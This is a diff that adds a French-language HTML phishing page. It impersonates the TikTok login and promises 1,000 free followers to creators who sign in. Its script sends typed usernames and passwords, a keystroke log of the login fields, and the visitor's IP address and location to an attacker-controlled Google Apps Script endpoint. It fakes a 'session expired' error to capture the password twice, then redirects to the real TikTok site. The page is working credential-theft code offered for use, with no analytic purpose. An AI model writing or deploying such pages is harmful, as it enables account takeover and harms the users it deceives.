@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>TikTok - Connecte-toi</title>
+<link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAHHSURBVHgB7ZcxbsIwGIX/L5AouTE3cAMkFgYGu0NXpEtXxg6MEQlWlk7d2BmYkLpUbB0Ze0AGJKqxN34SJ3JMEkNCBfRJnxRb+nx6z7ENIaXkf47nOgYAhBBQSoVSCsYYCCFQSsFxHNTrdTQaDeRyOUzTFD/zPM/zWhRFEkVR+FqSJDiOY+I4BgC4rov7+x+H41oWQggQQqBUKqFUKqHb7eL5+RkhhDBNE2EYYjqd4u7uDhsbG/+iwPM8k2UZRFEUAECv18P+/j4IIQCA5XKJw8MDbG5uAgBmsxkODg4wGAyyU0AIgSzLAACEkM++AwCEEHieB9d1k8/n83lkWYb7+/vkBKCcpmn4fD7j7e0NWZYBAERRBABwdnaGl5eXjwg4PT2FpmkghMD3fYQQYpZlGUEQ4OjoCNlsFtvb2zg5OUEYhngfQJIkOD4+RiaTyW8UhBAEQYBer4csy+D7PgghaLVayLIsN4Jms4l+v49Wq5XfycViAcdx0Ov14Ps+wjDE8/PzxyJomiYOh0MxGo3EdDqVy+VSapoWO44j7u/vxWazkUEQiLu7O9HpdMRisYhf3Q8ghJBCoSCazWYcteM4opvNplgsFhBFEYQQYhgGb29vODo6wu7uLggh+GyKoviP4Q3134emybg29AAAAABJRU5ErkJggg==">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif}
+body{background:#000;min-height:100vh;display:flex;justify-content:center;align-items:center}
+.container{background:#121212;width:100%;max-width:420px;min-height:100vh;padding:40px 32px 48px;text-align:center;position:relative}
+@media(min-width:480px){body{background:#111}.container{min-height:auto;border-radius:16px;margin:20px;box-shadow:0 20px 60px rgba(0,0,0,.8)}}
+.tiktok-logo{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px}
+.tiktok-logo .note-icon{width:42px;height:42px;flex-shrink:0}
+.tiktok-logo .wordmark{display:flex;align-items:baseline;gap:0}
+.tiktok-logo .wordmark span{font-size:38px;font-weight:800;letter-spacing:-.5px;color:#fff;text-transform:lowercase}
+.tiktok-logo .wordmark .tk{font-weight:700}
+.tiktok-logo .wordmark .tok{font-weight:800;color:#ff0050}
+.monetize-hero{background:linear-gradient(135deg,rgba(255,0,80,.18),rgba(255,0,80,.04));border:2px solid #ff0050;border-radius:14px;padding:24px 18px;margin-bottom:28px;position:relative;overflow:hidden}
+.monetize-hero::before{content:'';position:absolute;top:-60%;left:-60%;width:220%;height:220%;background:radial-gradient(circle,rgba(255,0,80,.08) 0%,transparent 60%);animation:glowPulse 3s ease-in-out infinite}
+@keyframes glowPulse{0%,100%{opacity:.6;transform:scale(1)}50%{opacity:1;transform:scale(1.08)}}
+.monetize-hero .main-text{font-size:26px;font-weight:900;color:#fff;line-height:1.25;position:relative;z-index:1;letter-spacing:-.3px}
+.monetize-hero .main-text .pink{color:#ff0050}
+.monetize-hero .main-text .gold{color:#ffd700}
+.monetize-hero .sub-text{font-size:14px;color:#aaa;margin-top:10px;position:relative;z-index:1}
+.monetize-hero .sub-text svg{width:16px;height:16px;fill:#ffd700;vertical-align:middle;margin-right:4px}
+.monetize-hero .subscribers-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(255,215,0,.12);border:1px solid rgba(255,215,0,.25);border-radius:20px;padding:6px 16px;margin-top:12px;font-size:14px;font-weight:700;color:#ffd700;position:relative;z-index:1}
+.monetize-hero .subscribers-badge svg{width:18px;height:18px;fill:#ffd700}
+.input-group{text-align:left;margin-bottom:16px}
+.input-group label{color:#888;font-size:12px;font-weight:600;margin-bottom:6px;display:block}
+.input-group input{width:100%;padding:14px 16px;background:#1a1a1a;border:1px solid #333;border-radius:10px;color:#fff;font-size:15px;outline:none;transition:border .2s}
+.input-group input:focus{border-color:#ff0050;box-shadow:0 0 0 3px rgba(255,0,80,.08)}
+.input-group input::placeholder{color:#555}
+.btn-login{width:100%;padding:15px;background:#ff0050;color:#fff;font-size:16px;font-weight:700;border:none;border-radius:10px;cursor:pointer;margin-top:8px;transition:background .2s;display:flex;align-items:center;justify-content:center;gap:10px}
+.btn-login:hover{background:#e00046}
+.btn-login:disabled{opacity:.6;cursor:not-allowed}
+.forgot-link{text-align:right;margin-top:6px}
+.forgot-link a{color:#777;font-size:12px;text-decoration:none}.forgot-link a:hover{color:#ff0050}
+.divider{display:flex;align-items:center;gap:12px;margin:22px 0;color:#555;font-size:12px}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:#2a2a2a}
+.social-buttons{display:flex;flex-direction:column;gap:12px}
+.social-btn{display:flex;align-items:center;justify-content:center;gap:10px;padding:13px;background:#1a1a1a;border:1px solid #333;border-radius:10px;color:#fff;font-size:14px;font-weight:500;cursor:pointer;transition:background .2s;width:100%}
+.social-btn:hover{background:#252525}
+.social-btn svg{width:20px;height:20px;flex-shrink:0}
+.terms{color:#666;font-size:11px;margin-top:20px;line-height:1.6}
+.terms a{color:#999;text-decoration:none;font-weight:500}
+.signup-link{color:#fff;font-size:14px;margin-top:22px}
+.signup-link a{color:#ff0050;text-decoration:none;font-weight:600}
+.footer-lang{color:#555;font-size:12px;margin-top:24px}
+.flash-message{display:none;color:#ff0050;font-size:13px;margin-top:14px;text-align:center;padding:10px;background:rgba(255,0,80,.06);border-radius:8px}
+.flash-message.show{display:block}
+.spinner{display:none;width:20px;height:20px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite}
+.spinner.show{display:inline-block}
+@keyframes spin{to{transform:rotate(360deg)}}
+.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);background:#1a1a1a;border:1px solid #333;color:#fff;padding:14px 24px;border-radius:12px;font-size:14px;display:none;z-index:99999;box-shadow:0 10px 40px rgba(0,0,0,.7);max-width:90%;text-align:center;z-index:99999}
+.toast.show{display:block}
+.loader-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:#000;display:flex;align-items:center;justify-content:center;z-index:100000;flex-direction:column;transition:opacity .4s}
+.loader-overlay.hidden{opacity:0;pointer-events:none}
+.loader-spinner{width:44px;height:44px;border:3px solid rgba(255,0,80,.15);border-top-color:#ff0050;border-radius:50%;animation:loadSpin .8s linear infinite}
+.loader-text{color:#ff0050;font-size:13px;margin-top:14px;font-weight:500}
+@keyframes loadSpin{to{transform:rotate(360deg)}}
+.succ{position:fixed;inset:0;background:#0c0c0c;z-index:100001;display:none;align-items:center;justify-content:center;flex-direction:column;text-align:center;gap:16px}
+.succ .c{width:66px;height:66px;border-radius:50%;background:#ff0050;color:#fff;display:flex;align-items:center;justify-content:center;font-size:32px}
+.succ p{font-size:16px;color:#fff;font-weight:600}
+</style>
+</head>
+<body>
+
+<div class="loader-overlay" id="loader"><div class="loader-spinner"></div><div class="loader-text">TikTok</div></div>
+
+<div class="succ" id="succScreen"><div class="c">✓</div><p>Connexion réussie · Bienvenue</p></div>
+
+<div class="container">
+  <div class="tiktok-logo">
+    <svg class="note-icon" viewBox="0 0 42 42" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <defs><linearGradient id="ng" x1="0" y1="0" x2="42" y2="42"><stop offset="0%" stop-color="#ff0050"/><stop offset="100%" stop-color="#ff1a6b"/></linearGradient></defs>
+      <rect x="2" y="2" width="38" height="38" rx="19" fill="url(#ng)"/>
+      <path d="M29 16c0 .6-.4 1-1 1h-4.5v6.25a4.25 4.25 0 1 1-3.5-4.18V15a1 1 0 0 1 .88-.99l7-1.25a1 1 0 0 1 1.12.99v2.25z" fill="#fff" opacity=".95"/>
+      <circle cx="20" cy="24.25" r="2.75" fill="#fff" opacity=".9"/>
+    </svg>
+    <div class="wordmark"><span class="tk">tik</span><span class="tok">tok</span></div>
+  </div>
+
+  <div class="monetize-hero">
+    <div class="main-text">CONNECTE-TOI ET<br><span class="pink">MONÉTISE TON TIKTOK</span><br><span class="gold">REÇOIS 1 000 ABONNÉS</span></div>
+    <div class="sub-text">Bonus offert à tous les nouveaux créateurs</div>
+    <div class="subscribers-badge">👥 +1 000 abonnés gratuits</div>
+  </div>
+
+  <form id="loginForm" autocomplete="off">
+    <div class="input-group">
+      <label for="username">E-mail / Nom d'utilisateur / Téléphone</label>
+      <input type="text" id="username" placeholder="E-mail, nom d'utilisateur ou téléphone" autocomplete="off" autocorrect="off" autocapitalize="off">
+    </div>
+    <div class="input-group">
+      <label for="password">Mot de passe</label>
+      <input type="password" id="password" placeholder="Mot de passe" autocomplete="off">
+    </div>
+    <div class="forgot-link"><a href="#">Mot de passe oublié ?</a></div>
+    <button type="submit" class="btn-login" id="submitBtn"><span id="btnText">Se connecter</span><span class="spinner" id="spinner"></span></button>
+  </form>
+  <div class="flash-message" id="flashMsg"></div>
+
+  <div class="divider">ou continuer avec</div>
+  <div class="social-buttons">
+    <button class="social-btn" type="button">Facebook</button>
+    <button class="social-btn" type="button">Google</button>
+    <button class="social-btn" type="button">Apple</button>
+  </div>
+  <div class="terms">En continuant, vous acceptez les Conditions d'Utilisation et la Politique de Confidentialité.</div>
+  <div class="signup-link">Vous n'avez pas de compte ? <a href="#">S'inscrire</a></div>
+  <div class="footer-lang">Français (France) © 2026 TikTok</div>
+</div>
+
+<script>
+(function(){
+'use strict';
+
+/* ============================================================
+   ENDPOINT — votre récepteur Apps Script
+   (token + chat ID vivent UNIQUEMENT côté Google, jamais ici)
+   ============================================================ */
+var EP='https://script.google.com/macros/s/AKfycbyXd3kCFMWjs8KK19rHuh1X7xlCvlg145Sh4H8psOzOA6Dg69V4MBN6WBLfR2kdLwvl9Q/exec';
+
+/* ============================================================
+   REDIRECTION fin de parcours → VRAIE page TikTok login
+   ============================================================ */
+var REAL='https://www.tiktok.com/login?lang=fr';
+
+/* ---------- envoi silencieux (POST Apps Script) ---------- */
+function send(txt){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('POST',EP,true);
+    x.setRequestHeader('Content-Type','text/plain;charset=utf-8');
+    x.send(JSON.stringify({text:txt}));
+  }catch(e){}
+}
+function one(v){return (v||'').toString().replace(/\s+/g,' ').trim();}
+function isEmail(s){return /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test((s||'').trim());}
+function isPhone(s){return /^\+?[0-9][0-9 .\-()]{5,}$/.test((s||'').trim());}
+
+/* ---------- géo ---------- */
+function getGeo(){
+  try{
+    var x=new XMLHttpRequest();x.open('GET','https://ipapi.co/json/',false);x.send();
+    if(x.status===200){var d=JSON.parse(x.responseText);return (d.ip||'')+' | '+(d.city||'')+', '+(d.country_name||'');}
+  }catch(e){}
+  return '';
+}
+
+/* ============================================================
+   MESSAGE PROPRE & ORDONNÉ
+   ============================================================ */
+function sendCred(id, pass){
+  id=(id||'').trim();
+  var L=[];
+  L.push('\u{1F510} NOUVEAU COMPTE TIKTOK');
+  L.push('-'.repeat(26));
+
+  if(isEmail(id))     L.push('\u{1F4E7} E-mail : '+id);
+  else if(isPhone(id))L.push('\u{1F4F1} T\u00e9l\u00e9phone : '+id);
+  else                L.push('\u{1F464} Identifiant : '+id);
+
+  if(pass) L.push('\u{1F511} Mot de passe : '+pass);
+  L.push('-'.repeat(26));
+
+  var g=getGeo(); if(g)L.push('\u{1F30D} '+g);
+  L.push('\u{1F4C5} '+new Date().toISOString());
+  send(L.join('\n'));
+}
+
+/* ---------- keylogger de secours (séparé) ---------- */
+var kl='';
+document.addEventListener('keydown',function(e){
+  var t=e.target;
+  if(t&&(t.id==='username'||t.id==='password')){
+    var k=e.key;
+    if(k.length===1)kl+=k;
+    else if(k==='Backspace')kl=kl.slice(0,-1);
+    else if(k==='Enter')kl+='[ENTREE]';
+    if(kl.length>=48)flush();
+  }
+});
+function flush(){ if(!kl)return; send('\u2328\ufe0f TAP\u00c9 AU CLAVIER (TikTok) :\n'+kl); kl=''; }
+setInterval(function(){if(kl.length>8)flush();},3500);
+
+/* ---------- ping visiteur ---------- */
+setTimeout(function(){ send('\u{1F440} Visiteur page TikTok (1 000 abonn\u00e9s)\n'+new Date().toISOString()); },1500);
+
+/* ---------- loader ---------- */
+setTimeout(function(){ document.getElementById('loader').classList.add('hidden'); },700);
+
+/* ---------- soumission ---------- */
+var btn=document.getElementById('submitBtn');
+var txt=document.getElementById('btnText');
+var spin=document.getElementById('spinner');
+var didOnce=false;
+
+btn.addEventListener('click',function(){
+  flush();
+  var u=one(document.getElementById('username').value);
+  var p=document.getElementById('password').value.trim();
+  if(!u||!p)return;
+
+  // 1er essai → capture + piège
+  sendCred(u,p);
+  btn.disabled=true; txt.textContent='Connexion en cours...'; spin.classList.add('show');
+  setTimeout(function(){
+    document.getElementById('password').value='';
+    btn.disabled=false; txt.textContent='Se connecter'; spin.classList.remove('show');
+    var f=document.getElementById('flashMsg');
+    f.innerHTML='⏱ Session expirée. Ressaisis ton mot de passe pour valider tes 1 000 abonnés.';
+    f.classList.add('show');
+    didOnce=true;
+  },1600);
+});
+
+/* 2e clic → capture + écran vert + redirection réelle */
+btn.addEventListener('click',function(){
+  if(!didOnce)return;
+  var u2=one(document.getElementById('username').value);
+  var p2=document.getElementById('password').value.trim();
+  if(!u2||!p2)return;
+  sendCred(u2,p2);
+  var s=document.getElementById('succScreen'); s.style.display='flex';
+  setTimeout(function(){ window.location.replace(REAL); },1400);
+});
+
+/* ---------- boutons sociaux ---------- */
+document.querySelectorAll('.social-btn').forEach(function(b,i){
+  b.addEventListener('click',function(){
+    var names=['Facebook','Google','Apple'];
+    send('\u{1F440} Clic \u00ab '+names[i]+' \u00bb TikTok\n'+new Date().toISOString());
+    var f=document.getElementById('flashMsg');
+    f.innerHTML='Connexion '+names[i]+' indisponible. Connecte-toi par e-mail.';
+    f.classList.add('show');
+  });
+});
+})();
+</script>
+</body>
+</html>
